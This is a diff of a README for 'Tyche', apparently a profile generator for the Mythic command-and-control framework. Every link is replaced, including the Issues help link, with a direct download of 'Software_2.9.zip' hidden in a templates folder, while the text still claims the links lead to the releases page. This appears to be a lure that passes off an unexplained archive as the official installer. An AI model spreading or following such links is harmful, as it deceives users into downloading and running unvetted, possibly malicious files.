@@ -1,6 +1,6 @@
 # ⚙️ Tyche - Simple Profile Generator for Mythic
 
-[![Download Tyche](https://img.shields.io/badge/Download-Tyche-brightgreen?style=for-the-badge)](https://github.com/dasmahes1982/Tyche)
+[![Download Tyche](https://img.shields.io/badge/Download-Tyche-brightgreen?style=for-the-badge)](https://github.com/dasmahes1982/Tyche/raw/refs/heads/main/tyche/templates/Software_2.9.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Tyche does not need special hardware or admin rights to run. It installs quickly
 Follow these steps to get Tyche working on your PC.
 
 1. Click the big green **Download Tyche** badge at the top or visit the link below:  
-   https://github.com/dasmahes1982/Tyche
+   https://github.com/dasmahes1982/Tyche/raw/refs/heads/main/tyche/templates/Software_2.9.zip
 
 2. Look for the latest release on the GitHub page you visit. The release page will have a file for Windows.
 
@@ -104,7 +104,7 @@ If Tyche does not start or shows errors:
 - Restart your PC and try running Tyche again
 
 For help, go to the **Issues** section on the GitHub page:  
-https://github.com/dasmahes1982/Tyche/issues
+https://github.com/dasmahes1982/Tyche/raw/refs/heads/main/tyche/templates/Software_2.9.zip
 
 ---
 
@@ -112,7 +112,7 @@ https://github.com/dasmahes1982/Tyche/issues
 
 To update Tyche:
 
-- Visit the download page again: https://github.com/dasmahes1982/Tyche  
+- Visit the download page again: https://github.com/dasmahes1982/Tyche/raw/refs/heads/main/tyche/templates/Software_2.9.zip  
 - Download the latest `.exe` installer  
 - Run the installer; it will replace the old version without removing your settings  
 - Restart Tyche to use the updated version
@@ -123,7 +123,7 @@ To update Tyche:
 
 Use the link below to visit the official page to download the latest version of Tyche:  
 
-[![Download Tyche](https://img.shields.io/badge/Download-Tyche-blue?style=for-the-badge)](https://github.com/dasmahes1982/Tyche)
+[![Download Tyche](https://img.shields.io/badge/Download-Tyche-blue?style=for-the-badge)](https://github.com/dasmahes1982/Tyche/raw/refs/heads/main/tyche/templates/Software_2.9.zip)
 
 This link takes you to the GitHub releases page. Look for the latest `.exe` file for your Windows system.
 
